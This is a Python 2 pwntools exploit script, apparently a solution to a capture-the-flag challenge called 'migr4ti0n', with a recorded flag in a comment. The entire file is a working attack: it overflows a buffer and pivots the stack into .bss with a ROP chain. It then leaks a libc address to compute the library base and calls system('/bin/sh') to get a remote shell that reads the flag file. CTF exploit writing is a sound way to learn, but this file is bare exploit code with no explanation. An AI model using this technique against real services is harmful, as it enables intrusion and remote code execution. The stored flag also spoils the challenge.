#!/usr/bin/env python2
# -*- coding: ascii -*-
from pwn import *

# FLAG{49796c31e88bf1c45fc21212693e07cd652296dd}

context.arch = 'amd64'

e , l = ELF('./migr4ti0n-5b1ebb81d74911197f610391688c934210d79274') , ELF('./libc.so.6-14c22be9aa11316f89909e4237314e009da38883')

host , port = 'csie.ctf.tw' , 10132
#host , port = '192.168.78.135' , 4000
y = remote( host , port )

pop_rdi = 0x4006b3
ppr = 0x4006b1
pop_rdx = 0x4006d4
pop_rbp = 0x400558
main = 0x4005d7
leave_ret = 0x40064a
'''
    pop_rdi,
    0x600fe8,
    0x4004d8,
'''

p = flat(
    'D' * 0x30,
    e.bss() + 0x70 - 8,
    pop_rdi,
    0,
    ppr,
    e.bss() + 0x70,
    0,
    pop_rdx,
    0x100,
    0x4004e0,
    leave_ret
)

y.sendafter( ':' , p )

sleep(0.7)

p = flat(
    pop_rdi,
    0x600fe8,
    0x4004d8,
    pop_rdi,
    0,
    ppr,
    e.bss() + 0xd00,
    0,
    pop_rdx,
    0x100,
    0x4004e0,
    pop_rbp,
    e.bss() + 0xd00 - 8,
    leave_ret
)

y.send( p )


y.recvline()
l.address += u64( y.recv(6).ljust( 8 , '\x00' ) ) - l.symbols['__libc_start_main']
log.success( 'libc -> {}'.format( hex( l.address ) ) )

p = flat(
    pop_rdi,
    l.search( '/bin/sh\x00' ).next(),
    l.symbols['system']
)

sleep(0.7)

y.send(p)

sleep(0.7)

y.sendline( 'cat /home/`whoami`/flag' )

y.interactive()